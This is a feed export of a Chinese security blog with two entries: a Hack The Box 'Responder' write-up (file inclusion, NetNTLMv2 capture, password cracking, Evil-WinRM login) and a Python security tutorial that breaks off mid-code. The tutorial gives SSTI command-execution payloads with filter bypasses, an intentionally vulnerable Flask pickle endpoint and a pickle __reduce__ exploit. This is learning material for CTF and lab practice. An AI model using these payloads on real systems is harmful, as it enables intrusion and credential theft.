    <link href="http://example.com/2024/12/13/Hack%20The%20Box-Responder/"/>
    <id>http://example.com/2024/12/13/Hack%20The%20Box-Responder/</id>
    <published>2024-12-13T09:56:20.000Z</published>
    <updated>2025-01-08T12:23:32.329Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件包含，并介绍了 SMB 协议和 Windows 操作系统的 NTLM 协议。除此之外，使用 Responder 工具来获取 NetNTLMv2 哈希值，并使用 John The Ripper  测试数百万个可能的密码，找到正确的管理员密码。最后，使用 Evil-WinRM 获取目标主机权限。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先使用 Nmap 扫描目标主机的开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.95.234</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213174908.png"></p><p>根据 Nmap 扫描的结果，发现该机器使用 Windows 操作系统。检测到两个端口处于打开状态。</p><p>打开 Firefox 并输入 <code>http://10.129.95.234</code>  时，网站重定向到 <code>http://unika.htb</code>。由于主机不知道如何解析 <code>unika.htb</code>（即无法将其转换为对应的 IP 地址），导致浏览器显示“无法找到该网站”的错误。</p><p><code>/etc/hosts</code> 文件用于将主机名解析为IP地址，因此我们需要在 &#x2F;etc&#x2F;hosts 文件中为该域添加一个条目，以使浏览器能够解析 unika.htb 的地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.95.234   unika.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br>//tee,同时写入到文件和屏幕<br>//-a,追加写入<br></code></pre></td></tr></table></figure><p>添加该条目后，访问 <code>unika.htb</code> 将直接解析为 <code>10.129.95.234</code>，无需通过外部 DNS 服务器。</p><p>刷新页面：</p><p><img src="/../images/Pasted%20image%2020241213180811.png"></p><p>编程语言是php：</p><p><img src="/../images/Pasted%20image%2020241213182532.png"></p><p>导航栏点击到 EN 时，URL 发生变化：</p><p><img src="/../images/Pasted%20image%2020241213180924.png"></p><p>页面是由 page 参数加载的，该参数可能受到<strong>文件包含</strong>漏洞的攻击。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>测试 page 参数，检查是否可以在服务器响应中包含目标系统上的文件。在Windows系统上，渗透测试可能尝试访问的最常见文件之一是 hosts 文件，路径为：  </p><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">WINDOWS\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p>使用目录穿越，逐步回退到根目录：</p><p><img src="/../images/Pasted%20image%2020241213182119.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>在 <code>php.ini</code> 配置文件中，<code>allow_url_include</code> 默认设置为 “Off”，表示 PHP 不会加载远程 HTTP 或 FTP URL，以防止远程文件包含攻击。然而，即使 <code>allow_url_include</code> 和 <code>allow_url_fopen</code> 设置为 “Off”，PHP 仍然可能允许 SMB URL 加载。</p><p>如果加载SMB URL ，Windows 将尝试进行身份验证，我们可以通过截取 NetNTLMv2获取用户密码。</p><ul><li><p><strong>SMB 协议</strong>:<br> SMB (Server Message Block) 协议是一个网络文件共享协议，主要用于在计算机之间共享文件、打印机和其他资源。它允许网络中的设备进行交互，例如访问文件系统、读取文件、写入文件以及与网络设备通信。</p></li><li><p><strong>NTLM:</strong></p><ul><li>NTLM (New Technology Lan Manager)是微软为 Windows 操作系统创建的一组身份验证协议。它是一种基于 Challenge-Response 的身份验证协议，用于在 Active Directory 域上验证客户端对资源的访问。</li><li>NTLM 身份验证的工作流程：<ol><li>客户端发送用户名和域名：<br> 客户端向服务器发送用户名和域名。</li><li>服务器生成 Challenge 字符串：<br> 服务器生成一个随机字符串，称为Challenge。</li><li>客户端加密 Challenge 字符串：<br> 客户端使用用户密码的 <strong>NTLM 哈希值</strong> 对 Challenge 字符串进行加密，并将结果发送回服务器。</li><li>服务器检索用户密码或等效值：<br> 服务器从安全账户数据库中检索用户密码或等效的哈希值。</li><li>服务器验证：<br> 服务器使用检索到的哈希值对 Challenge 字符串进行加密，得到的值与客户端返回的值进行比较。如果两者匹配，客户端身份验证成功。</li></ol></li></ul></li><li><p><strong>NetNTLMv2</strong>：<br>  它是 NTLMv2 的一个扩展版本，比 NTLMv1 提供了更强的安全性。它是一个包括 Challenge 和Response 的字符串，但由于人们常常通过类似对哈希值的攻击方法来破解它，所以它又被普遍称为 NetNTLMv2 哈希。</p></li></ul><p>通过使用<a href="https://github.com/lgandx/Responder">Responder</a>工具，攻击者可以伪装成 SMB 服务器来拦截和收集 NetNTLMv2 Challenge-Response 对。<br><a href="https://www.freebuf.com/articles/network/256844.html">内网渗透之Responder攻防（上） - FreeBuf网络安全行业门户</a></p><p>验证 Responder.conf 中侦听 SMB 请求开关是否开启：</p><p><img src="/../images/Pasted%20image%2020241213193547.png"></p><p>接下来使用 python3 启动 Responder 监听：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> Responder.<span class="hljs-keyword">py</span> -I tun0<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194021.png"></p><p>响应方服务器准备就绪后，通过设置 page 参数，告诉服务器包含来自 SMB 服务器的资源：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.6/</span>whatever <span class="hljs-comment"># 随便写一个文件名</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194801.png"></p><p>这时看 Responder，发现显示了Administrator 帐户的 NetNTLMv：</p><p><img src="/../images/Pasted%20image%2020241213195046.png"></p><p>将这个值存储到一个文件中：</p><p><img src="/../images/Pasted%20image%2020241213195358.png"></p><p>我们将哈希文件传递给<strong>John the Ripper</strong>（一个密码哈希破解程序），破解管理员帐户的密码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john -w=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span>.txt<br></code></pre></td></tr></table></figure><p>john 会尝试给定密码列表中的每个密码，并使用该密码加密 Response。如果结果与响应匹配，则找到了正确的密码：</p><p><img src="/../images/Pasted%20image%2020241213200448.png"></p><p>从 nmap 扫描结果中，我们发现 winrm （Windows Remote Management） 服务（5985）已启用。接下来连接到目标上的 WinRM服务，并尝试获取会话。使用 <strong>Evil-WinRM</strong> ：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213203019.png"></p><p>最终找到flag（windows cmd.exe 用dir 查看当前文件夹下的内容，type 查看文件内容）：</p><p><img src="/../images/Pasted%20image%2020241213202816.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这是 Hack The Box 新手关卡第二阶段的第四关，明显感觉很吃力，不过收获颇丰。通过这一关，我认识了三个渗透神器：Responder 、 John The Ripper 和 Evil-WinRM 。最重要的是，对文件包含漏洞的利用有了更加深刻的理解，即使 allow_url_include 开关没开，居然也有办法执行远程文件包含。不过以上整个渗透过程，如果现在单独再操作一遍，还是无法完成。目前能力欠佳，相信通过多刷题能力提升之后，就可以复现了。再次感慨这个平台做得真好。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Python安全</title>
    <link href="http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2024/12/11/Python%E5%AE%89%E5%85%A8/</id>
    <published>2024-12-11T11:26:54.000Z</published>
    <updated>2024-12-13T12:57:33.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h1><p>SSTI（Server Side Template Injection，服务器端模板注入）：服务端接收攻击者的输入，将其作为 Web 应用模板内容的一部分。在进行目标编译渲染的过程中，执行了所插入的恶意内容。从而导致信息泄露、代码执行、GetShell 等问题，其影响范围取决于模版引擎复杂性。</p><p>模板引擎和渲染函数本身是没有漏洞的，该漏洞产生原因在于模板可控引发代码注入，凡是使用模板的地方都可能会出现 SSTI 的问题。</p><p>不同模版引擎对应不同的解析符号：<br><img src="/../images/Pasted%20image%2020241211204556.png"></p><p>如何判断是否存在SSTI注入？</p><ul><li>提交的数据如果在页面中有显示，即可进行SSTI测试。</li><li>根据该模版引擎的解析符号，尝试注入简单的模板表达式，比如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，观察页面是否直接返回表达式结果。</li><li>正常情况下，用户输入应当被视为普通文本，不应执行其中的任何代码。如果输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</li></ul><p>自动化工具：<a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></p><h2 id="Python对象的魔术方法"><a href="#Python对象的魔术方法" class="headerlink" title="Python对象的魔术方法"></a>Python对象的魔术方法</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__class__</span>：类的一个内置属性，表示实例对象的类。<br><br><span class="hljs-emphasis">__base__</span>：类型对象的直接基类。<br><br><span class="hljs-emphasis">__bases__</span>：类型对象的全部基类，以元组形式，类型的实例通常没有属性 。<br><br><span class="hljs-emphasis">__mro__</span> ：解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><br><span class="hljs-emphasis">__subclasses__</span>()：返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。<br><br><span class="hljs-emphasis">__init__</span>：初始化类，返回的类型是function。<br><br><span class="hljs-emphasis">__globals__</span>：使用方式是 函数名.<span class="hljs-emphasis">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><br><span class="hljs-emphasis">__dic__</span>：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-emphasis">__dict__</span>里。<br><br><span class="hljs-emphasis">__getattribute__</span>()：实例、类、函数都具有的<span class="hljs-emphasis">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-emphasis">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><br><span class="hljs-emphasis">__getitem__</span>()：调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="hljs-emphasis">&#x27;b&#x27;</span>]，就是a.<span class="hljs-emphasis">__getitem__</span>(<span class="hljs-emphasis">&#x27;b&#x27;</span>)<br><br><span class="hljs-emphasis">__builtins__</span> ：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<br><br><span class="hljs-emphasis">__import__</span> ：动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).popen(<span class="hljs-emphasis">&#x27;ls&#x27;</span>).read()]<br><br><span class="hljs-emphasis">__str__</span>()：返回描写这个对象的字符串，可以理解成就是打印出来。<br></code></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><p>下面的语句均拼接到模板渲染的接收参数处。</p><ol><li>查看当前环境中哪些子类可用。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211212759.png"></p><ol start="2"><li>查找利用类索引。</li></ol><p>开启vscode的正则表达式模式，把逗号替换成\n，方便查看。找到利用类的索引，如</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>索引从 0 开始排序，根据环境不同，索引也不同，所以需要实际情况分析。</p><p>该类的索引是144：<br><img src="/../images/Pasted%20image%2020241211213043.png"></p><ol start="3"><li>查看该类所处空间下可使用的所有变量。</li></ol><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241211213808.png"></p><ol start="4"><li>构造利用类方法。</li></ol><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__.popen(<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>显示没有这个属性：</p><p><img src="/../images/2be29370c82470255945ff4c2273df1b.png"></p><p>失败原因是Python 3.8 及以上，<code>dict</code> 明确不支持通过点号访问键，强制使用 <code>[&#39;key&#39;]</code> 的方式。</p><p>于是尝试改为以下格式：</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[133].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;calc&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>成功打开计算器：</p><p><img src="/../images/Pasted%20image%2020241211222236.png"></p><p>若是读取文件，要用 popen 命令，不能用system。因为 os.system 只是执行，无回显。而 popen 自带读取函数 read，可以得到执行命令的结果进行回显。</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[144].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight prolog"><table><tr><td class="code"><pre><code class="hljs prolog">//获得基类:<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>] # python3<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">2</span>] # python2<br>&#123;&#125;.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] ().<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] [].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>] request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br>request.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">1</span>]<br><br>//文件操作 <br>//python3 已经移除了file。所以利用 file 子类文件读取只能在 python2 中用。<br>//找到file类 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>] <br>//读文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <br>//写文件 :<br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp&#x27;</span>).write(<span class="hljs-string">&#x27;test&#x27;</span>)<br><br>//命令执行 <br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) <br><br>[].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">144</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p><p><a href="https://www.suyou.world/index.php/2024/01/22/%e7%ac%ac70%e5%a4%a9%ef%bc%9aweb%e6%94%bb%e9%98%b2-python%e5%ae%89%e5%85%a8ssti%e6%a8%a1%e7%89%88%e6%b3%a8%e5%85%a5jinja2%e5%bc%95%e6%93%8e%e5%88%a9%e7%94%a8%e7%bb%95%e8%bf%87%e9%a1%b9%e7%9b%ae/">第70天：WEB攻防-Python安全&amp;SSTI模版注入&amp;Jinja2引擎&amp;利用绕过项目&amp;黑盒检测 – The-Starry-Sky</a></p><h2 id="实例分析-NewStar-CTF-2024-Week2-Web-复读机"><a href="#实例分析-NewStar-CTF-2024-Week2-Web-复读机" class="headerlink" title="实例分析-NewStar-CTF-2024-Week2-Web-复读机"></a>实例分析-NewStar-CTF-2024-Week2-Web-复读机</h2><ol><li>确定注入点是否存在 SSTI。</li></ol><p>输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入。</p><ol start="2"><li>探索过滤规则。</li></ol><p>尝试注入 <code>&#123;&#123; "a".__class__&#125;&#125;</code> 来获取当前对象的类。页面输出异常信息（“bot 显示不喜欢上课”），说明 <code>__class__</code> 被过滤，<code>.</code> 可能也会被视为敏感字符，因为它能直接访问对象的属性。</p><p>遇到关键字被过滤的情况，可以利用字符串拼接等技巧绕过过滤，例如 <code>&#123;&#123;"a"['__cl'+'ass__']&#125;&#125;</code>，绕过 <code>__class__</code> 关键字限制。其中用<code>[]</code> 来绕过<code>.</code>过滤<br><img src="/../images/Pasted%20image%2020241029221640.png"><br>3. 利用 SSTI 获取敏感对象和方法。</p><p>SSTI 的目的是执行服务端代码，所以我们需要找到一个能操作系统命令的类。</p><p>对于大多数语言，<code>object</code> 是所有类的基类，我们可以通过访问 <code>object</code> 来找到各种可能的类。</p><p>可以通过表达式 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]&#125;&#125;</code>获取 <code>object</code> 类；<br><img src="/../images/Pasted%20image%2020241029222218.png"><br>然后通过 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]['__subc'+'lasses__']()&#125;&#125;</code> 获得所有子类的列表。</p><p><img src="/../images/Pasted%20image%2020241029222419.png"></p><ol start="4"><li>查找可利用的类。</li></ol><p>在获得 <code>subclasses()</code> 列表后，可以遍历其中的类，找到可能用于执行命令的类。在这个例子中，可以选择 <code>os._wrap_close</code>（通常位于索引 132，不同的 Python 版本和环境中，索引值可能有所不同）类。</p><p><code>os._wrap_close</code> 类中包含了可以帮助调用系统命令的方法，比如 <code>__init__</code> 中可以访问 <code>__globals__</code> 属性，进一步获取 Python 内置的 <code>eval</code> 函数。</p><ol start="5"><li>利用 <code>eval</code> 执行系统命令</li></ol><p>构造命令执行的表达式：</p><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">&#123;&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;.<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__mro__&#x27;</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subc&#x27;</span>+<span class="hljs-string">&#x27;lasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[132]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241029223458.png"></p><h1 id="Python-反序列化漏洞"><a href="#Python-反序列化漏洞" class="headerlink" title="Python 反序列化漏洞"></a>Python 反序列化漏洞</h1><h2 id="python-常用-反-序列化函数"><a href="#python-常用-反-序列化函数" class="headerlink" title="python 常用 (反) 序列化函数"></a>python 常用 (反) 序列化函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">pickle<span class="hljs-selector-class">.dump</span> (obj, file) : 将对象序列化后保存到文件<br>pickle<span class="hljs-selector-class">.load</span> (file) : 将文件序列化内容反序列化为对象<br>pickle<span class="hljs-selector-class">.dumps</span> (obj) : 将对象序列化成字符串格式的字节流<br>pickle<span class="hljs-selector-class">.loads</span> (bytes_obj) : 将字符串字节流反序列化为对象<br>PyYAML yaml<span class="hljs-selector-class">.load</span>()<br>JSON json<span class="hljs-selector-class">.loads</span>(s)<br>marshal<br></code></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight erlang"><table><tr><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">reduce</span> <span class="hljs-params">()</span>：反序列化时调用。</span><br><span class="hljs-function"><span class="hljs-title">reduce_ex</span> <span class="hljs-params">()</span> ：反序列化时调用，同时都有的时候，执行 <span class="hljs-title">reduce_ex</span> ，不执行 <span class="hljs-title">reduce</span>。</span><br><span class="hljs-function"><span class="hljs-title">setstate</span> <span class="hljs-params">()</span> ：反序列化时调用（类似于 <span class="hljs-title">php</span> 的 <span class="hljs-title">isset</span> ）。</span><br><span class="hljs-function"><span class="hljs-title">getstate</span> <span class="hljs-params">()</span> ：序列化时调用。</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"> import pickle<br> import base64<br> <span class="hljs-keyword">from</span> flask import Flask, request<br> app = Flask(__name__)<br> ​<br> @app.route(<span class="hljs-string">&quot;/&quot;</span>)<br> def index():<br>     try:<br>        <span class="hljs-built_in"> user </span>= base64.b64decode(request.cookies.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-built_in"> user </span>= pickle.loads(user) #反序列化<br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> %<span class="hljs-built_in"> user</span><br><span class="hljs-built_in"></span>     except:<br>         username = <span class="hljs-string">&quot;Guest&quot;</span><br>         return <span class="hljs-string">&quot;Hello %s&quot;</span> % username<br> ​<br> ​<br> <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>     app.<span class="hljs-built_in">run</span>(<br>         <span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>         <span class="hljs-attribute">port</span>=5000,<br>         <span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span><br>    )<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"> <span class="hljs-keyword">import</span> requests<br> <span class="hljs-keyword">import</span> pickle<br> <span class="hljs-keyword">import</span> os<br> <span class="hljs-keyword">import</span> base64<br> ​<br> <span class="hljs-keyword">class</span> exp(<span class="hljs-keyword">object</span>):<br>     def __reduce__(self):<br>         <span class="hljs-keyword">return</span> (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;,))<br> ​<br> ​<br> e = exp()<br> s = pickle.dumps(e)<br> <span class="hljs-keyword">user</span>=base64.b64encode(s).decode()<br> print(<span class="hljs-keyword">user</span>)<br> response = requests.<span class="hljs-keyword">get</span>(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(<span class="hljs-keyword">user</span>=base64.b64encode(s).decode()))<br></code></pre></td></tr></table></figure><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><a href="https://xz.aliyun.com/t/3569?time__1311=n4+xnii=G=DQoiKDtbDs63xCq7KtYvNUKA00Qx">Python Web之flask session&amp;格式化字符串漏洞 - 先知社区</a></p><p>在 python 中，提供了 4 种格式化字符串方式。</p><ol><li><strong>%操作符</strong></li></ol><p>沿袭C语言中printf语句的风格：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;Hello, %s&#x27;</span> % name</span><br>&quot;Hello, Bob&quot;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>string.Template</strong></li></ol><p>使用标准库中的模板字符串类进行字符串格式化：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name = <span class="hljs-string">&#x27;Bob&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> Template</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t = Template(<span class="hljs-string">&#x27;Hey, $name!&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">t.substitute(name=name)</span><br>&#x27;Hey, Bob!&#x27;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>调用format方法</strong></li></ol><p>python3后引入的新版格式化字符串写法：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; <span class="hljs-type">name</span> , errno = <span class="hljs-string">&#x27;Bob&#x27;</span> , <span class="hljs-number">50159747054</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hello, &#123;&#125;&#x27;</span>.format(<span class="hljs-type">name</span>)<br><span class="hljs-string">&#x27;Hello, Bob&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-string">&#x27;Hey &#123;name&#125;, there is a 0x&#123;errno:x&#125; error!&#x27;</span>.format(<span class="hljs-type">name</span>=<span class="hljs-type">name</span>, errno=errno)<br><span class="hljs-string">&#x27;Hey Bob, there is a 0xbadc0ffee error!&#x27;</span><br></code></pre></td></tr></table></figure><p>但是这种写法存在安全隐患：</p><figure class="highlight python-repl"><table><tr><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">config = &#123;<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span 